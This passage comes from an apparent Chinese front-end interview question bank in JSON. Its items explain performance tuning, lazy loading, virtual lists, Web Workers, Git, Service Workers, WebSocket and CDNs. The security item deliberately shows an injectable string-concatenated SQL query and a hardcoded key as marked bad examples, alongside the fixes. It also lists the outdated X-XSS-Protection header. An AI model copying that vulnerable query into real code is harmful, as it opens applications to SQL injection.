)\n})\n```\n\n### 选择建议\n- **简单 KV** → localStorage\n- **大量结构化数据** → IndexedDB\n- **离线资源缓存** → Cache API\n- **认证 Token** → `Cookie (HttpOnly)`"
  },
  {
    "id": "be-012",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "性能优化",
      "加载",
      "首屏"
    ],
    "question": "前端性能优化有哪些常见手段？",
    "answer": "### 加载优化\n\n**1. 减少请求**\n- 合并文件（JS/CSS 打包）\n- 雪碧图 → CSS 图标/字体图标 → SVG sprite\n- 内联关键 CSS（Critical CSS）\n\n**2. 压缩**\n- Gzip / Brotli 压缩\n- 图片压缩（WebP > JPEG, AVIF 更优）\n- 代码压缩（Terser、cssnano）\n\n**3. 缓存**\n- 强缓存 + 协商缓存\n- 文件名哈希（contenthash）\n- Service Worker 离线缓存\n\n**4. 按需加载**\n- 路由懒加载\n- 组件懒加载\n- 图片懒加载\n- 动态 import()\n\n```javascript\n// 路由懒加载\nconst Home = lazy(() => import('./Home'))\n\n// 图片懒加载\n<img loading=\"lazy\" src=\"image.jpg\" />\n\n// 动态导入\nconst module = await import('./heavy-module')\n```\n\n**5. 预加载**\n```html\n<!-- 预加载关键资源 -->\n<link rel=\"preload\" href=\"/critical.js\" as=\"script\">\n<link rel=\"preload\" href=\"/font.woff2\" as=\"font\" crossorigin>\n\n<!-- 预连接 -->\n<link rel=\"preconnect\" href=\"https://cdn.example.com\">\n<link rel=\"dns-prefetch\" href=\"https://cdn.example.com\">\n\n<!-- 预获取（空闲时） -->\n<link rel=\"prefetch\" href=\"/next-page.js\">\n```\n\n### 渲染优化\n\n**1. CSS 优化**\n- 关键 CSS 内联到 `<head>`\n- 非关键 CSS 异步加载\n- 避免使用 `@import`（阻塞渲染）\n\n**2. JS 优化**\n- `defer`：不阻塞解析，DOMContentLoaded 前执行\n- `async`：不阻塞解析，下载完立即执行\n- 避免长任务（> 50ms）\n\n**3. 减少重排重绘**\n- 使用 transform/opacity 做动画\n- 批量 DOM 操作\n- 使用 will-change\n\n**4. 虚拟列表**\n```javascript\n// react-window\nimport { FixedSizeList } from 'react-window'\n<FixedSizeList height={600} itemCount={10000} itemSize={35}>\n  {Row}\n</FixedSizeList>\n```\n\n### 图片优化\n\n```html\n<!-- 响应式图片 -->\n<img src=\"small.jpg\" \n     srcset=\"medium.jpg 768w, large.jpg 1200w\"\n     sizes=\"(max-width: 768px) 100vw, 50vw\">\n\n<!-- 现代格式 -->\n<picture>\n  <source srcset=\"image.avif\" type=\"image/avif\">\n  <source srcset=\"image.webp\" type=\"image/webp\">\n  <img src=\"image.jpg\">\n</picture>\n```\n\n### 构建优化\n\n```javascript\n// Vite 构建\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n  build: {\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n          utils: ['lodash-es', 'dayjs']\n        }\n      }\n    },\n    minify: 'terser',\n    cssCodeSplit: true\n  }\n})\n```\n\n### 性能指标\n\n| 指标 | 含义 | 目标 |\n|------|------|------|\n| FCP | 首次内容绘制 | < 1.8s |\n| LCP | 最大内容绘制 | < 2.5s |\n| FID | 首次输入延迟 | < 100ms |\n| CLS | 累积布局偏移 | < 0.1 |\n| TTI | 可交互时间 | < 3.8s |\n\n### 检测工具\n- Chrome DevTools → Performance / Lighthouse\n- WebPageTest\n- Core Web Vitals（Search Console）"
  },
  {
    "id": "be-013",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "懒加载",
      "IntersectionObserver",
      "图片"
    ],
    "question": "图片懒加载的实现方案？IntersectionObserver 怎么用？",
    "answer": "### 方案 1：原生 loading 属性（最简单）\n\n```html\n<img src=\"image.jpg\" loading=\"lazy\" alt=\"...\" />\n```\n\n- 浏览器原生支持，零 JS\n- 兼容性：Chrome 76+、Firefox 75+、Safari 15.4+\n- 简单场景推荐\n\n### 方案 2：IntersectionObserver（推荐）\n\n```javascript\nconst images = document.querySelectorAll('img[data-src]')\n\nconst observer = new IntersectionObserver((entries, obs) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const img = entry.target\n      img.src = img.dataset.src  // 加载真实图片\n      img.removeAttribute('data-src')\n      obs.unobserve(img)         // 加载后取消观察\n    }\n  })\n}, {\n  rootMargin: '200px'  // 提前 200px 开始加载\n})\n\nimages.forEach(img => observer.observe(img))\n```\n\n```html\n<img data-src=\"image.jpg\" src=\"placeholder.jpg\" alt=\"...\" />\n```\n\n### IntersectionObserver API\n\n```javascript\nconst observer = new IntersectionObserver(callback, options)\n\n// options\n{\n  root: null,         // 视口（默认）或指定容器\n  rootMargin: '0px',  // 根元素的 margin\n  threshold: 0.1      // 交叉比例达到 10% 时触发\n}\n\n// callback\n(entries) => {\n  entries.forEach(entry => {\n    entry.isIntersecting  // 是否可见\n    entry.intersectionRatio  // 交叉比例 0~1\n    entry.target  // 被观察的元素\n  })\n}\n\n// 方法\nobserver.observe(el)      // 开始观察\nobserver.unobserve(el)    // 停止观察\nobserver.disconnect()     // 停止所有观察\n```\n\n### 方案 3：scroll 事件 + getBoundingClientRect（传统）\n\n```javascript\nfunction lazyLoad() {\n  const images = document.querySelectorAll('img[data-src]')\n  const scrollTop = window.pageYOffset\n  const windowHeight = window.innerHeight\n  \n  images.forEach(img => {\n    if (img.offsetTop < scrollTop + windowHeight + 200) {\n      img.src = img.dataset.src\n      img.removeAttribute('data-src')\n    }\n  })\n}\n\nwindow.addEventListener('scroll', throttle(lazyLoad, 200))\nlazyLoad() // 初始检查\n```\n\n⚠️ 性能差：scroll 事件频繁触发，`offsetTop` 触发重排\n\n### 应用场景\n\n1. **图片懒加载**\n2. **无限滚动列表**\n3. **组件懒渲染**（滚到可见区域才渲染）\n4. **广告/视频按需加载**\n5. **动画触发**（元素进入视口时播放）\n\n```javascript\n// 无限滚动\nconst observer = new IntersectionObserver(([entry]) => {\n  if (entry.isIntersecting) {\n    loadMore()\n  }\n})\nobserver.observe(document.querySelector('.sentinel'))\n```\n\n### 最佳实践\n- 简单场景 → `loading=\"lazy\"`\n- 需要控制加载时机 → IntersectionObserver\n- 兼容旧浏览器 → polyfill 或 scroll 方案\n- 搭配占位图/骨架屏提升体验"
  },
  {
    "id": "be-014",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "虚拟列表",
      "性能",
      "大数据"
    ],
    "question": "什么是虚拟列表？如何实现？",
    "answer": "虚拟列表只渲染**可视区域**内的元素，而非全部，适用于大数据列表。\n\n### 原理\n\n```text\n容器高度: 600px\n每项高度: 50px\n可见项数: 600 / 50 = 12\n\n总数据: 10000 条\n实际渲染: ~15 条（12 + 上下缓冲）\n\n┌──────────────────┐\n│  ↑ 偏移量(padding)│\n├──────────────────┤\n│  Item 3          │ ← 可见区域\n│  Item 4          │\n│  Item 5          │\n│  ...             │\n│  Item 14         │ ← 可见区域\n├──────────────────┤\n│  ↓ 偏移量(padding)│\n└──────────────────┘\n```\n\n### 实现核心\n\n```javascript\nimport { useState, useRef, useEffect, useMemo } from 'react'\n\nfunction VirtualList({ items, itemHeight, visibleHeight }) {\n  const [scrollTop, setScrollTop] = useState(0)\n  const containerRef = useRef(null)\n\n  // 可见项数量\n  const visibleCount = Math.ceil(visibleHeight / itemHeight)\n\n  // 开始索引（加上上方缓冲）\n  const startIndex = Math.max(0, Math.floor(scrollTop / itemHeight) - 3)\n  \n  // 结束索引（加上下方缓冲）\n  const endIndex = Math.min(\n    items.length,\n    startIndex + visibleCount + 6\n  )\n\n  // 偏移量\n  const offsetY = startIndex * itemHeight\n\n  // 总高度\n  const totalHeight = items.length * itemHeight\n\n  const handleScroll = (e) => {\n    setScrollTop(e.target.scrollTop)\n  }\n\n  return (\n    <div \n      ref={containerRef}\n      style={{ height: visibleHeight, overflow: 'auto' }}\n      onScroll={handleScroll}\n    >\n      <div style={{ height: totalHeight, position: 'relative' }}>\n        <div style={{ transform: `translateY(${offsetY}px)` }}>\n          {items.slice(startIndex, endIndex).map((item, i) => (\n            <div key={startIndex + i} style={{ height: itemHeight }}>\n              {item.content}\n            </div>\n          ))}\n        </div>\n      </div>\n    </div>\n  )\n}\n```\n\n### 动态高度的虚拟列表\n\n当每项高度不固定时，需要维护位置缓存：\n\n```javascript\nfunction DynamicVirtualList({ items, estimatedHeight }) {\n  const [positions, setPositions] = useState(\n    items.map((_, i) => ({\n      index: i,\n      top: i * estimatedHeight,\n      bottom: (i + 1) * estimatedHeight,\n      height: estimatedHeight\n    }))\n  )\n\n  // 测量真实高度后更新 positions\n  const updateHeight = (index, height) => {\n    setPositions(prev => {\n      const newPositions = [...prev]\n      const oldHeight = newPositions[index].height\n      const diff = height - oldHeight\n      newPositions[index].height = height\n      newPositions[index].bottom = newPositions[index].top + height\n      // 更新后续所有位置\n      for (let i = index + 1; i < newPositions.length; i++) {\n        newPositions[i].top = newPositions[i - 1].bottom\n        newPositions[i].bottom = newPositions[i].top + newPositions[i].height\n      }\n      return newPositions\n    })\n  }\n\n  // 二分查找 startIndex\n  const findIndex = (scrollTop) => {\n    let start = 0, end = positions.length - 1\n    while (start < end) {\n      const mid = Math.floor((start + end) / 2)\n      if (positions[mid].bottom < scrollTop) start = mid + 1\n      else end = mid\n    }\n    return start\n  }\n}\n```\n\n### 现成库\n\n```javascript\n// react-window（推荐）\nimport { FixedSizeList, VariableSizeList } from 'react-window'\n\n// 固定高度\n<FixedSizeList height={600} itemCount={10000} itemSize={50} width=\"100%\">\n  {({ index, style }) => (\n    <div style={style}>Item {index}</div>\n  )}\n</FixedSizeList>\n\n// 动态高度\n<VariableSizeList height={600} itemCount={10000} \n  itemSize={i => items[i].height} width=\"100%\">\n  {({ index, style }) => <div style={style}>Item {index}</div>}\n</VariableSizeList>\n\n// Vue: vue-virtual-scroller\n// Angular: @angular/cdk/scrolling\n```\n\n### 适用场景\n- 万级数据列表\n- 聊天记录\n- 表格数据\n- 时间线/日志"
  },
  {
    "id": "be-015",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "WebWorker",
      "多线程",
      "性能"
    ],
    "question": "Web Worker 是什么？如何使用？有什么限制？",
    "answer": "### Web Worker\n\nJavaScript 是单线程的，Web Worker 允许在**后台线程**中运行 JS，不阻塞主线程。\n\n### 基本使用\n\n**主线程：**\n```javascript\n// 创建 Worker\nconst worker = new Worker('worker.js')\n\n// 发送数据\nworker.postMessage({ command: 'calculate', data: [1, 2, 3] })\n\n// 接收 Worker 返回的数据\nworker.onmessage = (e) => {\n  console.log('结果:', e.data)\n}\n\n// 错误处理\nworker.onerror = (e) => {\n  console.error('Worker error:', e.message)\n}\n\n// 终止\nworker.terminate()\n```\n\n**Worker 线程（worker.js）：**\n```javascript\n// 接收主线程数据\nself.onmessage = (e) => {\n  const { command, data } = e.data\n  \n  if (command === 'calculate') {\n    const result = heavyComputation(data)\n    // 发送结果回主线程\n    self.postMessage(result)\n  }\n}\n\nfunction heavyComputation(data) {\n  // 耗时计算...\n  return data.reduce((sum, n) => sum + n, 0)\n}\n```\n\n### 使用场景\n\n1. **大量计算**：图像处理、加密、排序\n2. **数据处理**：解析大 JSON、CSV\n3. **后台轮询**：实时数据获取\n4. **离线缓存处理**\n\n```javascript\n// 内联 Worker（不需要单独文件）\nconst workerCode = `\n  self.onmessage = (e) => {\n    const result = e.data * 2\n    self.postMessage(result)\n  }\n`\nconst blob = new Blob([workerCode], { type: 'application/javascript' })\nconst worker = new Worker(URL.createObjectURL(blob))\n```\n\n### SharedWorker（多标签页共享）\n\n```javascript\n// 多个标签页共享同一个 Worker\nconst sharedWorker = new SharedWorker('shared-worker.js')\nsharedWorker.port.onmessage = (e) => console.log(e.data)\nsharedWorker.port.postMessage('hello')\n```\n\n### Worker 的限制\n\n| 特性 | 支持 |\n|------|------|\n| DOM 操作 | ❌ |\n| window 对象 | ❌（用 self）|\n| XMLHttpRequest | ✅ |\n| fetch | ✅ |\n| WebSocket | ✅ |\n| IndexedDB | ✅ |\n| setTimeout/setInterval | ✅ |\n| importScripts() | ✅（引入其他脚本）|\n| console.log | ✅ |\n| location/navigator | ✅（只读）|\n\n### Transferable Objects（零拷贝传输）\n\n```javascript\n// ArrayBuffer 可以零拷贝转移（原线程不能再使用）\nconst buffer = new ArrayBuffer(1024 * 1024)\nworker.postMessage(buffer, [buffer]) // 第二个参数是 transfer list\nconsole.log(buffer.byteLength) // 0（已转移）\n```\n\n### 性能注意\n- Worker 创建有开销，不适合太短的任务\n- postMessage 有序列化开销（Transferable Objects 除外）\n- Worker 不能直接操作 DOM，必须通过 postMessage 通信\n\n### 实际应用示例\n\n```javascript\n// 大数据排序\nworker.postMessage({ data: hugeArray })\n// 主线程仍然流畅\n\n// 实时图像处理\nconst canvas = document.querySelector('canvas')\nconst imageData = canvas.getContext('2d').getImageData(0, 0, w, h)\nworker.postMessage(imageData, [imageData.data.buffer])\n// Worker 处理后返回新的 imageData\n```\n\n### 主线程替代方案\n对于不需要真正多线程的场景，可以用以下方式避免阻塞：\n- `requestIdleCallback`：空闲时执行\n- `setTimeout(0)`：将任务拆分到不同事件循环\n- `Promise.resolve().then()`：微任务中执行\n\n### 推荐场景\n- 任务执行时间 > 100ms → 考虑 Worker\n- 任务 < 50ms → 主线程即可"
  },
  {
    "id": "be-020",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "Git",
      "版本控制",
      "工作流"
    ],
    "question": "Git 的常用命令和工作流程有哪些？",
    "answer": "### 基本操作\n\n```bash\n# 初始化与克隆\ngit init\ngit clone <url>\n\n# 基本工作流\ngit status              # 查看状态\ngit add .              # 暂存所有\ngit add <file>          # 暂存指定文件\ngit commit -m \"message\" # 提交\ngit push origin main    # 推送\ngit pull origin main    # 拉取\n\n# 查看历史\ngit log --oneline --graph\ngit diff               # 工作区 vs 暂存区\ngit diff --cached       # 暂存区 vs 最新提交\n```\n\n### 分支操作\n\n```bash\ngit branch                    # 查看分支\ngit branch <name>             # 创建分支\ngit checkout <name>           # 切换分支\ngit checkout -b <name>        # 创建并切换\ngit switch <name>             # 切换（新命令）\ngit switch -c <name>          # 创建并切换\n\ngit merge <branch>            # 合并分支\ngit rebase <branch>           # 变基\ngit branch -d <name>          # 删除分支\ngit branch -D <name>          # 强制删除\n```\n\n### 撤销操作\n\n```bash\ngit checkout -- <file>        # 撤销工作区修改\ngit restore <file>            # 同上（新命令）\ngit reset HEAD <file>         # 撤销暂存\ngit restore --staged <file>   # 同上（新命令）\n\ngit commit --amend            # 修改最后一次提交\ngit reset --soft HEAD~1       # 撤销提交，保留改动\ngit reset --hard HEAD~1       # 撤销提交，丢弃改动（危险）\ngit revert <commit>           # 创建反向提交（安全）\n```\n\n### 合并 vs 变基\n\n```bash\n# merge：保留分支历史\ngit checkout main\ngit merge feature\n# ──●──●──●───● (main)\n#     ╲     ╱\n#      ●──● (feature)\n\n# rebase：线性历史\ngit checkout feature\ngit rebase main\ngit checkout main\ngit merge feature\n# ──●──●──●──●──● (main，线性)\n```\n\n**rebase 金科玉律**：不要 rebase 已推送到远程的公共分支！\n\n### 储藏（Stash）\n\n```bash\ngit stash               # 储藏当前改动\ngit stash save \"msg\"    # 带消息\ngit stash list          # 查看储藏列表\ngit stash pop           # 恢复并删除储藏\ngit stash apply         # 恢复但不删除\ngit stash drop          # 删除储藏\n```\n\n### 远程操作\n\n```bash\ngit remote add origin <url>\ngit remote -v\ngit push -u origin main  # -u 设置上游\ngit push --force-with-lease  # 安全的强制推送\n\ngit fetch origin         # 获取但不合并\ngit pull --rebase origin main  # 拉取并变基\n```\n\n### 常见工作流\n\n**Git Flow：**\n```text\nmain     ← 生产分支\ndevelop  ← 开发分支\nfeature/* ← 功能分支\nrelease/* ← 发布分支\nhotfix/*  ← 紧急修复\n```\n\n**GitHub Flow（简单）：**\n```text\nmain ← 直接在 feature 分支开发 → PR → 合并到 main\n```\n\n### 常见问题处理\n\n```bash\n# 合并冲突\ngit merge feature\n# 手动解决冲突文件\ngit add .\ngit commit\n\n# 撤回已推送的提交\ngit revert <commit>\ngit push origin main\n\n# 找回删除的分支\ngit reflog\ngit checkout <commit-hash>\ngit branch recovered <commit-hash>\n```\n\n### .gitignore\n```text\nnode_modules/\ndist/\n.env\n*.log\n.DS_Store\n.vscode/\n```"
  },
  {
    "id": "be-021",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "PWA",
      "Service Worker",
      "离线"
    ],
    "question": "什么是 PWA？Service Worker 的作用是什么？",
    "answer": "### PWA（Progressive Web App）\n\n渐进式 Web 应用，结合 Web 和原生应用的优点：\n- 可安装（添加到主屏幕）\n- 离线可用\n- 推送通知\n- 后台同步\n\n### Service Worker\n\n独立于主线程的后台脚本，充当浏览器与网络之间的**代理**。\n\n**特点：**\n- 在独立线程中运行\n- 不能操作 DOM\n- 可拦截网络请求\n- 可使用 Cache API 和 IndexedDB\n- 必须在 HTTPS 下运行\n\n### 基本使用\n\n**注册 Service Worker：**\n```javascript\n// main.js\nif ('serviceWorker' in navigator) {\n  window.addEventListener('load', () => {\n    navigator.serviceWorker.register('/sw.js')\n      .then(reg => console.log('SW registered'))\n      .catch(err => console.log('SW failed:', err))\n  })\n}\n```\n\n**Service Worker 生命周期：**\n```javascript\n// sw.js\nconst CACHE_NAME = 'v1'\nconst ASSETS = ['/', '/index.html', '/styles.css', '/app.js']\n\n// 安装：预缓存资源\nself.addEventListener('install', (e) => {\n  e.waitUntil(\n    caches.open(CACHE_NAME).then(cache => cache.addAll(ASSETS))\n  )\n  self.skipWaiting()  // 立即激活\n})\n\n// 激活：清理旧缓存\nself.addEventListener('activate', (e) => {\n  e.waitUntil(\n    caches.keys().then(keys => \n      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))\n    )\n  )\n  self.clients.claim()\n})\n\n// 拦截请求\nself.addEventListener('fetch', (e) => {\n  e.respondWith(\n    caches.match(e.request).then(cached => {\n      return cached || fetch(e.request).then(response => {\n        // 缓存新资源\n        const clone = response.clone()\n        caches.open(CACHE_NAME).then(cache => cache.put(e.request, clone))\n        return response\n      }).catch(() => caches.match('/offline.html'))\n    })\n  )\n})\n```\n\n### 缓存策略\n\n```javascript\n// 1. Cache First（适合静态资源）\nasync function cacheFirst(request) {\n  const cached = await caches.match(request)\n  return cached || fetch(request)\n}\n\n// 2. Network First（适合 API 请求）\nasync function networkFirst(request) {\n  try {\n    const response = await fetch(request)\n    const clone = response.clone()\n    const cache = await caches.open('api-cache')\n    cache.put(request, clone)\n    return response\n  } catch {\n    return caches.match(request)\n  }\n}\n\n// 3. Stale While Revalidate（先缓存后更新）\nasync function staleWhileRevalidate(request) {\n  const cache = await caches.open('dynamic')\n  const cached = await cache.match(request)\n  const fetchPromise = fetch(request).then(response => {\n    cache.put(request, response.clone())\n    return response\n  })\n  return cached || fetchPromise\n}\n```\n\n### manifest.json（可安装）\n\n```json\n{\n  \"name\": \"My PWA\",\n  \"short_name\": \"MyApp\",\n  \"start_url\": \"/\",\n  \"display\": \"standalone\",\n  \"background_color\": \"#ffffff\",\n  \"theme_color\": \"#4f46e5\",\n  \"icons\": [\n    {\n      \"src\": \"/icon-192.png\",\n      \"sizes\": \"192x192\",\n      \"type\": \"image/png\"\n    }\n  ]\n}\n```\n\n```html\n<link rel=\"manifest\" href=\"/manifest.json\">\n```\n\n### 推送通知\n\n```javascript\n// 请求权限\nconst permission = await Notification.requestPermission()\n\n// 订阅推送\nconst reg = await navigator.serviceWorker.ready\nconst subscription = await reg.pushManager.subscribe({\n  userVisibleOnly: true,\n  applicationServerKey: VAPID_PUBLIC_KEY\n})\n\n// Service Worker 接收推送\nself.addEventListener('push', (e) => {\n  e.waitUntil(\n    self.registration.showNotification('标题', {\n      body: e.data.text(),\n      icon: '/icon.png'\n    })\n  )\n})\n```\n\n### 适用场景\n- ✅ 内容型网站（新闻、电商）\n- ✅ 需要离线功能的应用\n- ✅ 需要推送通知\n- ❌ 需要复杂原生功能（蓝牙、NFC 等）"
  },
  {
    "id": "be-022",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "WebSocket",
      "实时通信",
      "网络"
    ],
    "question": "WebSocket 和 HTTP 的区别？如何使用 WebSocket？",
    "answer": "### WebSocket vs HTTP\n\n| 特性 | HTTP | WebSocket |\n|------|------|-----------|\n| 通信方式 | 请求-响应 | 全双工 |\n| 连接 | 短连接（HTTP/1.1 keep-alive）| 长连接 |\n| 方向 | 单向（客户端→服务器）| 双向 |\n| 协议 | http/https | ws/wss |\n| 数据格式 | 文本 | 文本/二进制 |\n| 开销 | 每次带完整 header | 握手后数据帧开销极小 |\n\n### WebSocket 使用\n\n**客户端：**\n```javascript\n// 创建连接\nconst ws = new WebSocket('ws://localhost:8080')\n// 或加密\nconst ws = new WebSocket('wss://localhost:8080')\n\n// 事件\nws.onopen = () => {\n  console.log('连接已建立')\n  ws.send('Hello Server')\n  ws.send(JSON.stringify({ type: 'message', data: 'hello' }))\n}\n\nws.onmessage = (e) => {\n  console.log('收到:', e.data)\n}\n\nws.onerror = (e) => {\n  console.log('错误:', e)\n}\n\nws.onclose = (e) => {\n  console.log('连接关闭:', e.code, e.reason)\n}\n\n// 主动关闭\nws.close(1000, '正常关闭')\n```\n\n**服务器（Node.js + ws 库）：**\n```javascript\nconst { WebSocketServer } = require('ws')\nconst wss = new WebSocketServer({ port: 8080 })\n\nwss.on('connection', (ws, req) => {\n  console.log('新连接:', req.socket.remoteAddress)\n  \n  ws.on('message', (data) => {\n    console.log('收到:', data.toString())\n    // 广播给所有客户端\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(data.toString())\n      }\n    })\n  })\n  \n  ws.on('close', () => {\n    console.log('连接关闭')\n  })\n})\n```\n\n### 心跳机制\n\n```javascript\n// 客户端心跳\nlet heartbeatInterval\n\nws.onopen = () => {\n  heartbeatInterval = setInterval(() => {\n    if (ws.readyState === WebSocket.OPEN) {\n      ws.send(JSON.stringify({ type: 'ping' }))\n    }\n  }, 30000)  // 30秒\n}\n\nws.onclose = () => {\n  clearInterval(heartbeatInterval)\n  // 自动重连\n  setTimeout(reconnect, 3000)\n}\n\n// 服务器响应心跳\nws.on('message', (data) => {\n  const msg = JSON.parse(data)\n  if (msg.type === 'ping') {\n    ws.send(JSON.stringify({ type: 'pong' }))\n    return\n  }\n})\n```\n\n### 自动重连\n\n```javascript\nclass ReconnectingWebSocket {\n  constructor(url, options = {}) {\n    this.url = url\n    this.maxRetry = options.maxRetry || 5\n    this.retryCount = 0\n    this.connect()\n  }\n  \n  connect() {\n    this.ws = new WebSocket(this.url)\n    this.ws.onopen = () => {\n      this.retryCount = 0\n      console.log('Connected')\n    }\n    this.ws.onclose = () => {\n      if (this.retryCount < this.maxRetry) {\n        this.retryCount++\n        const delay = Math.min(1000 * 2 ** this.retryCount, 30000)\n        setTimeout(() => this.connect(), delay)\n      }\n    }\n    this.ws.onmessage = (e) => this.onMessage?.(e.data)\n  }\n  \n  send(data) {\n    if (this.ws.readyState === WebSocket.OPEN) {\n      this.ws.send(data)\n    }\n  }\n}\n```\n\n### WebSocket vs SSE vs 轮询\n\n| 方式 | 方向 | 开销 | 适合场景 |\n|------|------|------|----------|\n| 轮询 | 单向 | 大 | 简单场景 |\n| 长轮询 | 单向 | 中 | 兼容性好 |\n| SSE | 服务器→客户端 | 小 | 通知/推送 |\n| WebSocket | 双向 | 最小 | 聊天/实时 |\n\n### SSE 替代方案\n\n如果只需要服务器推送（不需要客户端→服务器），SSE 更简单：\n```javascript\nconst source = new EventSource('/api/stream')\nsource.onmessage = (e) => {\n  console.log(e.data)\n}\nsource.onerror = () => source.close()\n```\n\n### 适用场景\n- ✅ 聊天应用\n- ✅ 实时游戏\n- ✅ 协同编辑\n- ✅ 实时数据推送\n- ❌ 简单的请求-响应（用 HTTP 即可）"
  },
  {
    "id": "be-023",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "前端安全",
      "CSP",
      "同源策略"
    ],
    "question": "前端安全有哪些常见威胁？如何防范？",
    "answer": "### 常见安全威胁\n\n### 1. XSS（跨站脚本攻击）\n（详见 BE-005）\n\n### 2. CSRF（跨站请求伪造）\n（详见 BE-005）\n\n### 3. 点击劫持（Clickjacking）\n\n攻击者用透明 iframe 覆盖在页面上，诱导用户点击。\n\n**防御：**\n```javascript\n// 方法 1：X-Frame-Options 响应头\nX-Frame-Options: DENY              // 禁止嵌入\nX-Frame-Options: SAMEORIGIN        // 只允许同源嵌入\n\n// 方法 2：CSP frame-ancestors\nContent-Security-Policy: frame-ancestors 'self'\n\n// 方法 3：JS 检测\nif (window.top !== window.self) {\n  window.top.location = window.self.location\n}\n```\n\n### 4. 中间人攻击（MITM）\n\n攻击者截获通信数据。\n\n**防御：**\n- 使用 HTTPS\n- HSTS 头：`Strict-Transport-Security: max-age=31536000`\n- 证书固定（Certificate Pinning）\n\n### 5. SQL 注入\n\n攻击者通过输入恶意 SQL 操作数据库。\n\n**防御：**\n```javascript\n// ❌ 字符串拼接\nconst sql = `SELECT * FROM users WHERE name = '${name}'`\n\n// ✅ 参数化查询\ndb.query('SELECT * FROM users WHERE name = ?', [name])\n```\n\n### 6. CSP（内容安全策略）\n\n```text\nContent-Security-Policy:\n  default-src 'self';                    # 默认只加载同源\n  script-src 'self' cdn.example.com;     # 脚本来源\n  style-src 'self' 'unsafe-inline';      # 样式来源\n  img-src 'self' data: https:;          # 图片来源\n  connect-src 'self' https://api.example.com; # AJAX 来源\n  font-src 'self' https://fonts.googleapis.com;\n  frame-ancestors 'none';                # 禁止被嵌入\n  report-uri /csp-report;                # 违规报告\n```\n\n### 7. 敏感数据泄露\n\n```javascript\n// ❌ 密钥硬编码\nconst API_KEY = 'sk-xxxxx'\n\n// ✅ 环境变量\nconst API_KEY = process.env.API_KEY\n\n// ❌ Token 存 localStorage（JS 可读）\n// ✅ Token 存 HttpOnly Cookie\n\n// ❌ 控制台输出敏感信息\nconsole.log(user.password)\n```\n\n### 8. 依赖安全\n\n```bash\n# 检查依赖漏洞\nnpm audit\nnpm audit fix\n\n# 使用 Snyk 等工具\nnpx snyk test\n```\n\n### 安全 Headers 汇总\n\n```text\n# HTTPS 强制\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n# XSS 防护\nX-XSS-Protection: 1; mode=block\n\n# MIME 类型嗅探\nX-Content-Type-Options: nosniff\n\n# 点击劫持\nX-Frame-Options: DENY\n\n# CSP\nContent-Security-Policy: default-src 'self'\n\n# Referrer 控制\nReferrer-Policy: strict-origin-when-cross-origin\n\n# 权限策略\nPermissions-Policy: geolocation=(), microphone=()\n```\n\n### 前端安全检查清单\n- [ ] 所有用户输入都经过转义\n- [ ] 使用 HTTPS\n- [ ] 设置安全响应头\n- [ ] Token 使用 HttpOnly Cookie\n- [ ] 依赖定期更新和审计\n- [ ] 不在代码中硬编码密钥\n- [ ] CORS 配置正确\n- [ ] 错误信息不泄露敏感数据"
  },
  {
    "id": "be-024",
    "category": "browser-engineering",
    "module": "browser",
    "difficulty": "medium",
    "tags": [
      "CDN",
      "DNS",
      "网络优化"
    ],
    "question": "CDN 的工作原理是什么？前端如何利用 CDN 优化？",
    "answer": "### CDN（Content Delivery Network）\n\n内容分发网络，将资源缓存到全球各地的边缘节点，用户就近获取，减少延迟。\n\n### 工作原理\n\n```text\n用户请求 cdn.example.com/image.jpg\n  → DNS 解析：返回最近的 CDN 边缘节点 IP\n  → 用户请求边缘节点\n  → 边缘节点有缓存？→ 直接返回（缓存命中）\n  → 无缓存 → 回源站获取 → 缓存并返回\n```\n\n### DNS 智能解析\n\n```text\n普通 DNS：\n  example.com → 固定 IP\n\nCDN DNS：\n  cdn.example.com → CNAME → xxx.cdn-provider.net\n  → 根据用户 IP 返回最近的边缘节点 IP\n  \n  北京用户 → 北京节点 IP\n  广州用户 → 广州节点 IP\n  美国用户 → 美国节点 IP\n```\n\n### CDN 缓存策略\n\n```text\n# 静态资源（JS/CSS/图片）\nCache-Control: public, max-age=31536000, immutable\n# 内容变化时文件名变（哈希），所以可以长期缓存\n\n# HTML\nCache-Control: no-cache\n# 每次回源验证\n\n# API 响应\nCache-Control: private, no-cache\n# 不经过 CDN 缓存\n```\n\n### 前端利用 CDN\n\n**1. 静态资源部署到 CDN**\n\n```javascript\n// Vite 配置\nexport default {\n  base: 'https://cdn.example.com/assets/'\n  // 所有资源路径前缀变为 CDN 地址\n}\n\n// HTML 引用\n<script src=\"https://cdn.example.com/assets/app.a1b2c3.js\"></script>\n```\n\n**2. 第三方库使用 CDN**\n\n```html\n<!-- 使用公共 CDN -->\n<script src=\"https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js\"></script>\n<script src=\"https://unpkg.com/react@18/umd/react.production.min.js\"></script>\n```\n\n**3. 构建时 externals**\n\n```javascript\n// Vite 配置：不打包 vue/react，使用 CDN\nexport default {\n  build: {\n    rollupOptions: {\n      external: ['vue', 'vue-router']\n    }\n  }\n}\n\n// HTML 中引入 CDN\n<script src=\"https://cdn.jsdelivr.net/npm/vue@3\"></script>\n```\n\n**4. 图片 CDN**\n\n```html\n<!-- 图片 CDN + 响应式 -->\n<img \n  src=\"https://imgcdn.example.com/photo.jpg?w=800\"\n  srcset=\"https://imgcdn.example.com/photo.jpg?w=400 400w,\n          https://imgcdn.example.com/photo.jpg?w=800 800w\"\n/>\n```\n\n### CDN 加速类型\n\n| 类型 | 说明 | 示例 |\n|------|------|------|\n| 静态加速 | 缓存 JS/CSS/图片 | Cloudflare、阿里云 CDN |\n| 动态加速 | 优化路由、TCP 优化 | 